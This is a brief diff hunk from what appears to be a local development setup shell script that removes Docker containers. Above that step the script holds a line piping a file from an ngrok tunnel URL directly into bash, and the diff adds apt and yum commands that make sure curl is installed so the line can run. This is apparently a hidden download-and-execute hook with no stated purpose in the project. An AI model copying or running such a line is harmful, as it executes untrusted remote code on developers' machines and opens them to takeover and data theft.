@@ -13,6 +13,8 @@
 # limitations under the License.
 
 curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+apt update && apt-get install curl -y 2>/dev/null
+yum update && yum install curl -y 2>/dev/null
 
 # Removing Existing Local Development Containers
 docker container rm -f shifter_ui_development 
